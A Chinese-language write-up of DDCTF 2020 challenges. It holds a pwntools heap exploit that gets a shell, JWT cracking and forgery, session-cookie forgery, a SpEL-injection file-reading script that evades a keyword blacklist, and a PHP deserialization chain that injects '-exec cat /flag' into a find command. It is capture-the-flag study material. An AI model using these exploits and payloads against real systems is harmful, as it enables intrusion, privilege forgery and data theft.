# DDCTF 2020 Writeup

阅读量 **312663**

|评论 **6**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-09-07 12:00:48

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t01d0afbf85fe157d13.png)

## we_love_free

vector结构：

    
    
    00000000 vector          struc ; (sizeof=0x18, mappedto_7)
    00000000                                         ; XREF: .bss:vec_/r
    00000000 start           dq ?
    00000008 cur             dq ?
    00000010 end             dq ?
    00000018 vector          ends
    00000018
    00000000 ; [00000018 BYTES. COLLAPSED STRUCT Elf64_Rela. PRESS CTRL-NUMPAD+ TO EXPAND]
    00000000 ; [00000010 BYTES. COLLAPSED STRUCT Elf64_Dyn. PRESS CTRL-NUMPAD+ TO EXPAND]
    

vector
的扩容规则是1,2,4,8,16,32,依次乘2个元素的时候会先申请新的空间，在把原来的数据拷贝到新申请的空间中，在释放原先的空间，对应申请的堆块大小（加上头部）0x20,0x20,0x30,0x50,0x90…..

漏洞点：

![](https://p3.ssl.qhimg.com/t0106c1685e48cf9619.png)

思路为：

  * 先`add`16个元素（0x90的堆块），这样调用`show`函数的时候，在`push 0xAABBCCDD`之后，原先的堆块就会被释放，这样就能有`UAF`的效果，先泄露下libc的地址，在调用`clear`函数清空，这里调用`clear`会触发`malloc_consolidate`，所以堆又会变成原来的样子
  * 在`add`至少`0x20`个元素，每个元素都为`one_gadget`，在堆上残留数据，在调用`clear`函数清空堆
  * 接着在`add`16个元素，调用`show`函数
  * `show`函数还会问我们要不要修改元素的值，所以我们可以把`unsorted bin`的`bk`指针改掉，用作`unsortedbin attack`，改成啥后面再说
  * 接着在修改`push 0xAABBCCDD`之后新申请的堆块的大小，改小`size`，在`clear`的时候不触发`malloc_consolidate`，这样就为后面的`unsortedbin attack`做好了准备
  * 最后只要在`add` 9 个元素，vector就会申请0x80大小的堆块，触发`unsortedbin attack`，将`unsortedbin`的地址写入一个地方

现在的问题就是将这个`unsortedbin`的地址写哪里了，我们可以看到程序用到了cin，cout，在data段上有指针指向他们虚表：

![](https://p4.ssl.qhimg.com/t01e0a521df83cf5823.png)

所以我们选择攻击cin或者cout，都试一下，效果如下：

![](https://p3.ssl.qhimg.com/t01abd8978bb061b9f5.png)

libc2.23有很多`one_gadget`，这里选的是：

![](https://p1.ssl.qhimg.com/t010b789bba6b551bcd.png)

  * 在add完元素之后就会调用cin，或者cout，就能触发one_gadget，拿到shell

**exp**

    
    
    from pwn import *
    
    context.arch = 'amd64'
    
    # context.terminal = ["tmux","split-window","-h"]
    
    def cmd(command):
        p.recvuntil(">>")
        p.sendline(str(command))
    def add(cap):
        cmd(1)
        p.recvuntil("num:")
        p.sendline(str(cap))
    
    def show():
        cmd(2)
    
    
    def clear():
        cmd(3)
    
    
    def main(host,port=5005):
        global p
        if host:
            p = remote(host,port)
        else:
            p = process("./pwn1")
            gdb.attach(p)
            # gdb.attach(p,"b *0x000000000401192")
        for i in range(0x10):
            add(0xcafebabedeadbeef)
        show()
        p.recvuntil("1:")
        libc.address = int(p.recvuntil('\n')[:-1]) - 0x3c4b78
        info("libc : " + hex(libc.address))
        for i in range(34):
            p.recvuntil("(y/n):")
            p.send('n')
        for i in range(0x10):
            add(libc.address)
        clear()
    
        for i in range(0x21):
            add(0xf67b0+libc.address)
        clear()
    
    
        # unsorted bin attack
        for i in range(0x10):
            add(0xcafebabedeadbeef)
        show()
        p.recvuntil("1:")
        p.recvuntil("(y/n):")
        p.send('n')
        p.recvuntil("(y/n):")
        p.send('y')
        # modify unsortedbin->bk
        p.sendline(str(0x6051f8-0x10))
        for i in range(32):
            p.recvuntil("(y/n):")
            p.send('y')
            p.sendline(str(0x71))
        clear()
        # trigger one_gadget
        for i in range(0x9):
            add(0xcafebabedeadbeef)
    
        p.interactive()
    
    if __name__ == "__main__":
        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
        main(args['REMOTE'])
    

## Web签到题

**题目描述**

    
    
    请从服务端获取client，利用client获取flag
    server url:http://117.51.136.197/hint/1.txt
    

打开
[http://117.51.136.197/hint/1.txt。](http://117.51.136.197/hint/1.txt%E3%80%82)

![](https://p5.ssl.qhimg.com/t018f240f36d6bf1608.png)

随便登录一下，返回的是 jwt。

![](https://p5.ssl.qhimg.com/t01c825a6abd6c13962.png)

再去 auth 验证，显示不是 admin。

![](https://p3.ssl.qhimg.com/t0101ef8fa9597d0096.png)

<https://jwt.io> 解码：

    
    
    {
      "userName": "1",
      "pwd": "2",
      "userRole": "GUEST",
      "exp": 1599455908
    }
    

尝试爆破：<https://github.com/brendan-rius/c-jwt-cracker.git>

    
    
    ➜  c-jwt-cracker git:(master) ✗ ./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6IjEiLCJwd2QiOiIyIiwidXNlclJvbGUiOiJHVUVTVCIsImV4cCI6MTU5OTQ1NTkwOH0.pmPAENHIrzdgFmXFH51YUYLci_7eMNFBVPHKjd0o4RQ
    Secret is "2"
    

伪造 JWT：

    
    
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6IjEiLCJwd2QiOiIyIiwidXNlclJvbGUiOiJBRE1JTiIsImV4cCI6MTU5OTQ1NTkwOH0.TUEJsckrY__hRRoKBv30-cXvDZwrTZq916CjC708L-4
    

![](https://p1.ssl.qhimg.com/t0189232c34b30335ec.png)

<http://117.51.136.197/B5Itb8dFDaSFWZZo/client> 下载下来。

![](https://p5.ssl.qhimg.com/t010b5936c5f88366a1.png)

Go 写的，简单逆一下，得到签名算法。

    
    
    package main
    
    import (
        "bytes"
        "io/ioutil"
        "net/http"
    
        "crypto/hmac"
        "crypto/sha256"
        "encoding/base64"
        "encoding/json"
        "time"
    
        "github.com/gin-gonic/gin"
    )
    
    type Param struct {
        Command   string `json:"command"`
        Signature string `json:"signature"`
        Timestamp int64  `json:"timestamp"`
    }
    
    func main() {
        r := gin.Default()
    
        r.POST("/", func(c *gin.Context) {
            command := c.DefaultPostForm("command", "DDCTF")
            key := "DDCTFWithYou"
    
            timestamp := time.Now().Unix()
            plain := fmt.Sprintf("%s|%d", command, timestamp)
            mac := hmac.New(sha256.New, []byte(key))
            mac.Write([]byte(plain))
    
            param := new(Param)
            param.Command = command
            param.Signature = base64.StdEncoding.EncodeToString(mac.Sum(nil))
            param.Timestamp = timestamp
            js, _ := json.Marshal(param)
    
            url := "http://117.51.136.197/server/command"
            resp, err := http.Post(url, "application/json", bytes.NewBuffer(js))
            if err != nil {
                panic(err)
            }
            defer resp.Body.Close()
            body, _ := ioutil.ReadAll(resp.Body)
            c.String(http.StatusOK, string(body))
        })
    
        r.Run(":2333")
    }
    

一开始还以为是 cel，SpEL 有点简单过滤，直接能读到 /flag。

![](https://p2.ssl.qhimg.com/t01417c7e47f5addd93.png)

    
    
    new java.util.Scanner(new java.io.File('/home/dc2-user/flag/flag.txt')).next()
    

## 卡片商店

**题目描述**

    
    
    题目链接：
    http://116.85.37.131/0714dcd10ba8571bc7887aeaa4adaa0e/
    

网站逻辑比较简单，总共有几个点：

  * 向朋友借钱 /loans?loans=999
  * 借钱给朋友 /sends?sends=999
  * 刷新卡片 /banlance
  * 兑换礼物 /gift
  * 重新开始 /reset

直接点兑换礼物，会显示：卡片数量不够 / 有借卡记录。

试几次发现借钱这有溢出，大概在 `2 ** 63 - 2` 左右。

<http://116.85.37.131/0714dcd10ba8571bc7887aeaa4adaa0e/loans?loans=9223372036854775807>

![](https://p1.ssl.qhimg.com/t01a310d48f38f1ed2b.png)

领礼物！

![](https://p3.ssl.qhimg.com/t01ea316a81c7ca678c.png)

尝试过程中，发现 cookie 一直在变的，看起来比较像 gin-session。

    
    
    MTU5OTM3MTgyOXxEdi1CQkFFQ180SUFBUkFCRUFBQV80dl9nZ0FDQm5OMGNtbHVad3dJQUFaM1lXeHNaWFFHYzNSeWFXNW5ERlFBVW5zaWIzZHBibWR6SWpwYlhTd2lhVzUyWlhOMGN5STZXMTBzSW0xdmJtVjVJam93TENKdWIzZGZkR2x0WlNJNk1UVTVPVE0zTVRneU9Td2ljM1JoY25SZmRHbHRaU0k2TVRVNU9UTTNNVGd5T1gwR2MzUnlhVzVuREFjQUJXRmtiV2x1QkdKdmIyd0NBZ0FBfO4vhpl7H2aOCvA6U6z8hL6S8JQp85w1Gc4MrGAvjS8S
    

并且，解码几次后发现有数据：

![](https://p3.ssl.qhimg.com/t01e80d4befd501698f.png)

弄个 Demo 验证一下：

    
    
    package main
    
    import (
        "github.com/gin-contrib/sessions"
        "github.com/gin-contrib/sessions/cookie"
        "github.com/gin-gonic/gin"
    )
    
    func main() {
        r := gin.Default()
        store := cookie.NewStore([]byte("secret"))
        r.Use(sessions.Sessions("session", store))
    
        r.GET("/hello", func(c *gin.Context) {
            session := sessions.Default(c)
    
            if session.Get("hello") != "world" {
                session.Set("hello", "world")
                session.Save()
            }
    
            c.JSON(200, gin.H{"hello": session.Get("hello")})
        })
    
        r.Run(":8000")
    }
    

![](https://p3.ssl.qhimg.com/t0101647c644a517d0f.png)

没毛病，那么礼物里给的 SecKey: Udc13VD5adM_c10nPxFu[@v12](https://github.com/v12 "@v12")
应该就是密钥了。

直接访问
[http://116.85.37.131/0714dcd10ba8571bc7887aeaa4adaa0e/flag，显示是不是幸运玩家。](http://116.85.37.131/0714dcd10ba8571bc7887aeaa4adaa0e/flag%EF%BC%8C%E6%98%BE%E7%A4%BA%E6%98%AF%E4%B8%8D%E6%98%AF%E5%B9%B8%E8%BF%90%E7%8E%A9%E5%AE%B6%E3%80%82)

![](https://p5.ssl.qhimg.com/t01160458245a71d7c6.png)

结合上面 base64 解码的来看，里面还有个 admin 的 bool 值，尝试伪造 cookie。拿上面的 Demo 改改：

    
    
    func main() {
        r := gin.Default()
        store := cookie.NewStore([]byte("Udc13VD5adM_c10nPxFu@v12"))
        r.Use(sessions.Sessions("session", store))
    
        r.GET("/hello", func(c *gin.Context) {
            session := sessions.Default(c)
            if session.Get("admin") != true {
                session.Set("admin", true)
                session.Save()
            }
    
            c.JSON(200, gin.H{"admin": session.Get("admin")})
        })
    
        r.Run(":8000")
    }
    

![](https://p0.ssl.qhimg.com/t015ffe0472553bde64.png)

    
    
    MTU5OTM3MjczMnxEdi1CQkFFQ180SUFBUkFCRUFBQUhmLUNBQUVHYzNSeWFXNW5EQWNBQldGa2JXbHVCR0p2YjJ3Q0FnQUJ8C_Mv8jlvNUHLHLCjWl4ADTbzs6s06pkZx1zQEC5xlRo=
    

直接就出 flag 了 ：）

![](https://p5.ssl.qhimg.com/t01bb27c6f88aa452e5.png)

另外，这 cookie 里的 session 大致格式可能是
`base64encode(timestamp|base64urlencode(gob)|xxx)`，可结合源码进行验证。

使用 <https://gitlab.com/drosseau/degob> 可以把中间部分逆出来：

![](https://p4.ssl.qhimg.com/t0126ec4e1fcb2ecf61.png)

    
    
    map[interface{}]interface{}{"wallet": "{"owings":[],"invests":[],"money":0,"now_time":1599371829,"start_time":1599371829}","admin": false}
    

## Easy Web

**题目描述**

    
    
    题目链接：
    http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/index
    

访问题目直接 302
到登录页面：<http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/login;jsessionid=D492DA095399C06CE3133D970ADDF11E>

登录时看到 rememberMe，大概率是打 Shiro，CVE 直接绕。

![](https://p5.ssl.qhimg.com/t016d2a45b6a5cee232.png)

任意读：http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=static/hello.jpg

http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/web.xml

    
    
    <web-app xmlns="http://java.sun.com/xml/ns/javaee" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"
    version="3.0" metadata-complete="false">
      <display-name>Archetype Created Web Application</display-name>
      <context-param>
        <param-name>contextConfigLocation</param-name>
        <param-value>classpath:spring-core.xml</param-value>
      </context-param>
      <listener>
        <listener-class>org.springframework.web.util.WebAppRootListener</listener-class>
      </listener>
      <listener>
        <listener-class>org.springframework.web.util.IntrospectorCleanupListener</listener-class>
      </listener>
      <listener>
        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>
      </listener>
      <servlet>
        <servlet-name>springmvc</servlet-name>
        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
        <init-param>
          <param-name>contextConfigLocation</param-name>
          <param-value>classpath:spring-web.xml</param-value>
        </init-param>
      </servlet>
      <servlet-mapping>
        <servlet-name>springmvc</servlet-name>
        <url-pattern>/</url-pattern>
      </servlet-mapping>
      <filter>
        <filter-name>encodingFilter</filter-name>
        <filter-class>org.springframework.web.filter.CharacterEncodingFilter</filter-class>
        <init-param>
          <param-name>encoding</param-name>
          <param-value>UTF-8</param-value>
        </init-param>
        <init-param>
          <param-name>forceEncoding</param-name>
          <param-value>true</param-value>
        </init-param>
      </filter>
      <filter-mapping>
        <filter-name>encodingFilter</filter-name>
        <url-pattern>/*</url-pattern>
      </filter-mapping>
      <filter>
        <filter-name>safeFilter</filter-name>
        <filter-class>com.ctf.util.SafeFilter</filter-class>
      </filter>
      <filter-mapping>
        <filter-name>safeFilter</filter-name>
        <url-pattern>/*</url-pattern>
      </filter-mapping>
      <filter>
        <filter-name>shiroFilter</filter-name>
        <filter-class>org.springframework.web.filter.DelegatingFilterProxy</filter-class>
        <init-param>
          <param-name>targetFilterLifecycle</param-name>
          <param-value>true</param-value>
        </init-param>
      </filter>
      <filter-mapping>
        <filter-name>shiroFilter</filter-name>
        <url-pattern>/*</url-pattern>
      </filter-mapping>
      <error-page>
        <error-code>500</error-code>
        <location>/error.jsp</location>
      </error-page>
      <error-page>
        <error-code>404</error-code>
        <location>/hacker.jsp</location>
      </error-page>
      <error-page>
        <error-code>403</error-code>
        <location>/hacker.jsp</location>
      </error-page>
    </web-app>
    

http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/util/SafeFilter.class

    
    
    package com.ctf.util;
    
    import javax.servlet.*;
    import javax.servlet.http.HttpServletResponse;
    import java.io.IOException;
    import java.util.Enumeration;
    import java.util.regex.Matcher;
    import java.util.regex.Pattern;
    
    public class SafeFilter implements Filter {
        private static final String[] blacklists = {"java.+lang", "Runtime|Process|byte|OutputStream|session|\"|'", "exec.*\\(", "write|read", "invoke.*\\(", "\\.forName.*\\(", "lookup.*\\(", "\\.getMethod.*\\(", "javax.+script.+ScriptEngineManager", "com.+fasterxml", "org.+apache", "org.+hibernate", "org.+thymeleaf", "javassist", "javax\\.", "eval.*\\(", "\\.getClass\\(", "org.+springframework", "javax.+el", "java.+io"};
        private final String encoding = "UTF-8";
    
        public void init(FilterConfig arg0) throws ServletException {
        }
    
        public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain)
                throws IOException, ServletException {
            request.setCharacterEncoding("UTF-8");
            response.setCharacterEncoding("UTF-8");
            Enumeration pNames = request.getParameterNames();
            while (pNames.hasMoreElements()) {
                String name = (String) pNames.nextElement();
                String value = request.getParameter(name);
                for (String blacklist : blacklists) {
                    Matcher matcher = Pattern.compile(blacklist, 34).matcher(value);
                    if (matcher.find()) {
                        HttpServletResponse servletResponse = (HttpServletResponse) response;
                        servletResponse.sendError(403);
                    }
                }
            }
            filterChain.doFilter(request, response);
        }
    
        public void destroy() {
        }
    }
    

http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/IndexController.class

    
    
    package com.ctf.controller;
    
    import com.ctf.model.User;
    import java.io.File;
    import java.io.FileInputStream;
    import java.io.IOException;
    import org.apache.shiro.SecurityUtils;
    import org.apache.shiro.subject.Subject;
    import org.springframework.core.io.ClassPathResource;
    import org.springframework.core.io.InputStreamResource;
    import org.springframework.http.HttpHeaders;
    import org.springframework.http.MediaType;
    import org.springframework.http.ResponseEntity;
    import org.springframework.http.ResponseEntity.BodyBuilder;
    import org.springframework.stereotype.Controller;
    import org.springframework.ui.Model;
    import org.springframework.util.DigestUtils;
    import org.springframework.web.bind.annotation.GetMapping;
    import org.springframework.web.bind.annotation.RequestMapping;
    import org.springframework.web.bind.annotation.RequestParam;
    
    @Controller
    public class IndexController {
        public IndexController() {
        }
    
        @RequestMapping({"/"})
        public String index() {
            return "redirect:/index";
        }
    
        @RequestMapping({"/index"})
        public String index(Model model) {
            try {
                Subject subject = SecurityUtils.getSubject();
                User user = (User)subject.getSession().getAttribute("user");
                model.addAttribute("name", user.getUsername());
            } catch (Exception var4) {
                model.addAttribute("name", "user");
            }
    
            return "index";
        }
    
        @GetMapping({"/unauthorized"})
        public String unauthorized() {
            return "unauthorized";
        }
    
        @RequestMapping({"img"})
        public Object img(@RequestParam("img") String img) {
            ResponseEntity response = null;
    
            try {
                ClassPathResource classPathResource = new ClassPathResource("../../" + img);
                File file = classPathResource.getFile();
                HttpHeaders headers = new HttpHeaders();
                headers.add("Cache-Control", "no-cache, no-store, must-revalidate");
                headers.add("Content-Disposition", "attachment; filename=" + DigestUtils.md5DigestAsHex(img.getBytes()) + ".jpg");
                headers.add("Pragma", "no-cache");
                headers.add("Expires", "0");
                response = ((BodyBuilder)ResponseEntity.ok().headers(headers)).contentType(MediaType.parseMediaType("application/octet-stream")).body(new InputStreamResource(new FileInputStream(file)));
                return response;
            } catch (IOException var6) {
                return "forbidden";
            }
        }
    }
    

http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/web/img?img=WEB-INF/classes/com/ctf/controller/AuthController.class

    
    
    package com.ctf.controller;
    
    import com.ctf.model.Role;
    import com.ctf.model.User;
    import java.util.Iterator;
    import javax.servlet.http.HttpSession;
    import org.apache.shiro.SecurityUtils;
    import org.apache.shiro.authc.UsernamePasswordToken;
    import org.apache.shiro.subject.Subject;
    import org.springframework.stereotype.Controller;
    import org.springframework.ui.Model;
    import org.springframework.web.bind.annotation.GetMapping;
    import org.springframework.web.bind.annotation.PostMapping;
    import org.springframework.web.bind.annotation.RequestParam;
    
    @Controller
    public class AuthController {
        public AuthController() {
        }
    
        @GetMapping({"/login"})
        public String login() {
            return "login";
        }
    
        @PostMapping({"/auth"})
        public String auth(@RequestParam("username") String username, @RequestParam("password") String password, HttpSession httpSession, Model model) {
            UsernamePasswordToken usernamePasswordToken = new UsernamePasswordToken(username, password);
            Subject subject = SecurityUtils.getSubject();
            String error = null;
    
            try {
                subject.login(usernamePasswordToken);
                User user = (User) subject.getPrincipal();
                httpSession.setAttribute("user", user);
                Iterator var9 = user.getRoles().iterator();
    
                Role role;
                do {
                    if (!var9.hasNext()) {
                        return "redirect:./index";
                    }
    
                    role = (Role) var9.next();
                } while (!role.getName().equals("admin"));
    
                return "redirect:./68759c96217a32d5b368ad2965f625ef/index";
            } catch (Exception var11) {
                error = "login failed!";
                model.addAttribute("error", true);
                model.addAttribute("msg", error);
                return "login";
            }
        }
    }
    

http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/index

黑名单还是比较严格的：

    
    
    {"java.+lang", 
    "javax.+el",
    "java.+io",
    
    "write|read|Runtime|Process|byte|OutputStream|session|\"|'",
    
    "exec.*\\(", 
    "invoke.*\\(", 
    "lookup.*\\(", 
    "eval.*\\(",
    
    "\\.forName.*\\(",
    "\\.getMethod.*\\(", 
    
    "\\.getClass\\(", 
    
    "javax.+script.+ScriptEngineManager", 
    "com.+fasterxml", 
    "org.+apache", 
    "org.+hibernate", 
    "org.+thymeleaf", 
    "org.+springframework",
    "javassist", 
    "javax\\."}
    

可结合 Thymeleaf 模板本身的特性去绕，或许可以 getshell，我这用的是 SpEL 的 payload 读了文件。

**exp**

    
    
    import re
    
    import requests
    from flask import Flask, request
    
    app = Flask(__name__)
    
    
    def requestToServer(content):
        content = '[[${{{}}}]]'.format(content)
        url = 'http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/customize'
        response = requests.post(url=url, data={'content': content}).text
        try:
            redirect = re.search('fetch \./(.*) !', response).group(1)
            url = 'http://116.85.37.131/6f0887622b5e34b5c9243f3ff42eb605/;/web/68759c96217a32d5b368ad2965f625ef/'
            url += redirect
            return requests.get(url).text
        except Exception as e:
            return str(e) + response
    
    
    def toForNameOrStr(source, strFlag=False):
        res = 'T(Character).toString(%s)' % ord(source[0])
        for ch in source[1:]:
            res += '.concat(T(Character).toString(%s))' % ord(ch)
        if strFlag:
            return res
        return '0.class. forName({})'.format(res)
    
    
    @app.route('/', methods=['GET', 'POST'])
    def handler():
        content = request.form.get('content')
        dir = request.form.get('dir')
        file = request.form.get('file')
    
        if dir:
            # 单层：java.util.Arrays.toString(java.nio.file.Files.list(java.nio.file.Paths.get("/")).toArray());
            # 递归：java.util.Arrays.toString(java.nio.file.Files.walk(java.nio.file.Paths.get("/")).toArray());
            listDirPayload = 'T(java.util.Arrays).toString({}.list({}.get({})).toArray())'.format(
                toForNameOrStr('java.nio.file.Files'), toForNameOrStr('java.nio.file.Paths'), toForNameOrStr(dir, True))
            print(listDirPayload)
            return requestToServer(listDirPayload)
    
        if file:
            # java.nio.file.Files.lines(java.nio.file.Paths.get("/flag")).findFirst().toString()
            catFilePaylod = '{}.lines({}.get({})).findFirst().toString()'.format(
                toForNameOrStr('java.nio.file.Files'), toForNameOrStr('java.nio.file.Paths'), toForNameOrStr(file, True))
            print(catFilePaylod)
            return requestToServer(catFilePaylod)
    
        return requestToServer(content)
    
    
    if __name__ == '__main__':
        app.run(debug=True)
    

## Overwrite Me

**题目描述**

    
    
    http://117.51.137.166/atkPWsr2x3omRZFi.php
    

直接给了源码：

    
    
    Welcome to DDCTF 2020, Have fun!
    
    <?php
    error_reporting(0);
    
    class MyClass
    {
        var $kw0ng;
        var $flag;
    
        public function __wakeup()
        {
            $this->kw0ng = 2;
        }
    
        public function get_flag()
        {
            return system('find /HackersForever ' . escapeshellcmd($this->flag));
        }
    }
    
    class HintClass
    {   
        protected  $hint;
        public function execute($value)
        {
            include($value);
        }
    
        public function __invoke()
        {
            if(preg_match("/gopher|http|file|ftp|https|dict|zlib|zip|bzip2|data|glob|phar|ssh2|rar|ogg|expect|\.\.|\.\//i", $this->hint))
            {
                die("Don't Do That!");
            }
            $this->execute($this->hint);
        }
    }
    
    class ShowOff
    {
        public $contents;
        public $page;
        public function __construct($file='/hint/hint.php')
        {
            $this->contents = $file;
            echo "Welcome to DDCTF 2020, Have fun!<br/><br/>";
        }
        public function __toString()
        {
            return $this->contents();
        }
    
        public function __wakeup()
        {
            $this->page->contents = "POP me! I can give you some hints!";
            unset($this->page->cont);
        }
    }
    
    class MiddleMan
    {
        private $cont;
        public $content;
        public function __construct()
        {
            $this->content = array();
        }
    
        public function __unset($key)
        {
            $func = $this->content;
            return $func();
        }
    }
    
    class Info
    {
        function __construct()
        {
            eval('phpinfo();');
        }
    
    }
    
    $show = new ShowOff();
    $bullet = $_GET['bullet'];
    
    if(!isset($bullet))
    {
        highlight_file(__FILE__);
        die("Give Me Something!");
    }else if($bullet == 'phpinfo')
    {
        $infos = new Info();
    }else
    {
        $obstacle1 = new stdClass;
        $obstacle2 = new stdClass;
        $mc = new MyClass();
        $mc->flag = "MyClass's flag said, Overwrite Me If You Can!";
        @unserialize($bullet);
        echo $mc->get_flag();
    }
    
    Give Me Something!
    

看到特意设置 `$this->kw0ng = 2;`，就能猜到是考 GMP 了。可参考
[https://paper.seebug.org/1267/。](https://paper.seebug.org/1267/%E3%80%82)

线上 include 一直读不到内容，放弃了。没想到 http://117.51.137.166/hint/hint.php 直接能访问……

    
    
    Good Job! You've got the preffix of the flag: DDCTF{VgQN6HXC2moDAq39And i'll give a hint, I have already installed the PHP GMP extension, It has a kind of magic in php unserialize, Can you utilize it to get the remaining flag? Go ahead!
    

GMP做法：

    
    
    $inner = 's:1:"4";a:2:{s:4:"flag";s:20:"-exec cat /flag {} ;";i:0;O:12:"DateInterval":1:{s:1:"y";R:2;}}';
    $exploit = 'a:1:{i:0;C:3:"GMP":'.strlen($inner).':{'.$inner.'}}';

不过这题不用 GMP 也能打。

    
    
    <?php
    
    class MyClass {
        var $kw0ng;
        var $flag;
    }
    
    class HintClass {
        protected $hint;
    }
    
    class ShowOff {
        public $contents;
        public $page;
    }
    
    class MiddleMan {
        public $content;
        private $cont;
    }
    
    
    $showoff = new ShowOff();
    $myclass = new MyClass();
    $myclass->flag = '-exec cat /flag {} ;';
    $showoff->page = new MiddleMan();
    $showoff->page->content = [$myclass, 'get_flag'];
    
    $paylod = urlencode(serialize($showoff));
    $url = 'http://117.51.137.166/atkPWsr2x3omRZFi.php?bullet=';
    echo file_get_contents($url . $paylod);
    

![](https://p2.ssl.qhimg.com/t01ad2398d61ff05772.png)

## Android reverse1

题目后来改成只需要输入 md5 结果就可以了，略。

## Android reverse2

基本是 re1 加了壳和 ollvm。

输入flag，进行 AES（key 是 `1234567890123456`），再进行一个类似 TEA 的块加密（12轮，key 是
`[20,20,30,40]`)。

块加密只要把加密流程倒过来就是解密，块加密部分代码如下：

    
    
    #include <stdio.h>
    
    void encrypt()
    {
        int ct[8] = {0xA1D4547,0x46F12E5A,0xFA679C2B,0xA90F985,0x4898B5D8,0x940C67C7,0xD2549BB2,0x7A2E9E37};
        unsigned int b0,b1,b2,b3,b4,b5,b6,b7;
        int k0,k1,k2,k3;
        int key[4] = {20,20,30,40};
        int round;
        unsigned int sum;
    
        b0 = ct[0];
        b1 = ct[1];
        b4 = ct[4];
        b5 = ct[5];
        b6 = ct[6];
        b7 = ct[7];
        b2 = ct[2];
        b3 = ct[3];
        round = -12;
        sum = 0x9E3779B9;
        int v15;
        do
        {
            v15 = (sum >> 2) & 3;
            k0 = key[v15];
            b0 += (((4 * b1) ^ (b7 >> 5)) + ((b1 >> 3) ^ (16 * b7))) ^ ((k0 ^ b7) + (b1 ^ sum));
            k1 = key[v15 ^ 1];
            b1 += (((4 * b2) ^ (b0 >> 5)) + ((b2 >> 3) ^ (16 * b0))) ^ ((k1 ^ b0) + (b2 ^ sum));
            k2 = key[v15 ^ 2];
            k3 = key[v15 ^ 3];
            b2 += (((4 * b3) ^ (b1 >> 5)) + ((b3 >> 3) ^ (16 * b1))) ^ ((k2 ^ b1) + (b3 ^ sum));
            b3 += (((4 * b4) ^ (b2 >> 5)) + ((b4 >> 3) ^ (16 * b2))) ^ ((k3 ^ b2) + (b4 ^ sum));
            b4 += (((4 * b5) ^ (b3 >> 5)) + ((b5 >> 3) ^ (16 * b3))) ^ ((k0 ^ b3) + (b5 ^ sum));
            b5 += (((4 * b6) ^ (b4 >> 5)) + ((b6 >> 3) ^ (16 * b4))) ^ ((k1 ^ b4) + (b6 ^ sum));
            b6 += (((4 * b7) ^ (b5 >> 5)) + ((b7 >> 3) ^ (16 * b5))) ^ ((k2 ^ b5) + (b7 ^ sum));
            b7 += (((4 * b0) ^ (b6 >> 5)) + ((b0 >> 3) ^ (16 * b6))) ^ ((k3 ^ b6) + (b0 ^ sum));
            sum -= 0x61C88647;
            if(b0 == 0x236CF790) {
                printf("%d!!\n",round);
            }
            round++;
        } while (round);
        ct[4] = b4;
        ct[5] = b5;
        ct[6] = b6;
        ct[7] = b7;
        ct[0] = b0;
        ct[1] = b1;
        ct[2] = b2;
        ct[3] = b3;
        for(int i=0;i<8;i++){
            printf("0x%x,", ct[i]);
        }
    }
    
    void decrypt() {
        unsigned int ct[8] = {3797070621,1774570762,3749504464,2331029089,3730067905,3512268604,3730298464,2946165678};
        unsigned int b0,b1,b2,b3,b4,b5,b6,b7;
        int k0,k1,k2,k3;
        int key[4] = {20,20,30,40};
        int round = -12;
        unsigned int sum;
    
        b0 = ct[0];
        b1 = ct[1];
        b4 = ct[4];
        b5 = ct[5];
        b6 = ct[6];
        b7 = ct[7];
        b2 = ct[2];
        b3 = ct[3];
        round = -12;
        sum = 0x9E3779B9 * 12;
        int v15;
        do
        {
            v15 = (sum >> 2) & 3;
            k0 = key[v15];
            k1 = key[v15 ^ 1];
            k2 = key[v15 ^ 2];
            k3 = key[v15 ^ 3];
    
            b7 -= (((4 * b0) ^ (b6 >> 5)) + ((b0 >> 3) ^ (16 * b6))) ^ ((k3 ^ b6) + (b0 ^ sum));
            b6 -= (((4 * b7) ^ (b5 >> 5)) + ((b7 >> 3) ^ (16 * b5))) ^ ((k2 ^ b5) + (b7 ^ sum));
            b5 -= (((4 * b6) ^ (b4 >> 5)) + ((b6 >> 3) ^ (16 * b4))) ^ ((k1 ^ b4) + (b6 ^ sum));
            b4 -= (((4 * b5) ^ (b3 >> 5)) + ((b5 >> 3) ^ (16 * b3))) ^ ((k0 ^ b3) + (b5 ^ sum));
            b3 -= (((4 * b4) ^ (b2 >> 5)) + ((b4 >> 3) ^ (16 * b2))) ^ ((k3 ^ b2) + (b4 ^ sum));
            b2 -= (((4 * b3) ^ (b1 >> 5)) + ((b3 >> 3) ^ (16 * b1))) ^ ((k2 ^ b1) + (b3 ^ sum));
            b1 -= (((4 * b2) ^ (b0 >> 5)) + ((b2 >> 3) ^ (16 * b0))) ^ ((k1 ^ b0) + (b2 ^ sum));
            b0 -= (((4 * b1) ^ (b7 >> 5)) + ((b1 >> 3) ^ (16 * b7))) ^ ((k0 ^ b7) + (b1 ^ sum));
    
            round++;
            sum += 0x61C88647;
        } while (round);
        ct[4] = b4;
        ct[5] = b5;
        ct[6] = b6;
        ct[7] = b7;
        ct[0] = b0;
